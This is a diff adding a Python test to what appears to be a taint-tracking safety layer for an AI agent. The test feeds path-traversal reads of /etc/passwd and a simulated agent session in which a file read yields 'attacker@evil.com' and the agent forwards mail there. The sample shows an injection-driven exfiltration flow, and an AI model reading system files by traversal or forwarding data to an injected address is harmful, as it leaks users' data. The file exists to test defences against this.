@@ -94,6 +94,24 @@ def test_read_locality_is_own_vs_external():
     assert extract_safety(send, sess("/tmp/downloaded.txt"))["taint-source"] == "read-external"
 
 
+def test_traversal_path_is_never_own_sourced():
+    # A `..` that escapes the working dir (or a trusted-substring prefix it traverses out
+    # of) must NOT earn read-own — otherwise an out-of-tree read downgrades the hard/soft
+    # split (M4 wires taint-source into enforcement). Definitionally external.
+    from credence_governor_core.safety import target_locality
+    assert target_locality("../../../etc/passwd", [".openclaw"], "/proj") == "external"
+    assert target_locality("/proj/../../etc/passwd", [".openclaw"], "/proj") == "external"
+    assert target_locality(".openclaw/../../../etc/passwd", [".openclaw"], "/proj") == "external"
+    # ...while a genuine in-tree path with a harmless `.` stays own.
+    assert target_locality("/proj/./src/x.py", [".openclaw"], "/proj") == "own"
+
+    send = ev("himalaya message forward", {"recipient": "attacker@evil.com"})
+    s = Session(project_root="/proj", trusted_paths=[".openclaw"], messages=[
+        Message(role="tool_call", tool_name="read", input={"path": "../../../etc/passwd"}),
+        Message(role="tool_result", tool_name="read", result="attacker@evil.com")])
+    assert extract_safety(send, s)["taint-source"] == "read-external"
+
+
 def test_bash_source_class_tracks_the_command():
     # A command tool's source class depends on the command: curl (network) beats
     # locality; a local command's class carries its target locality.
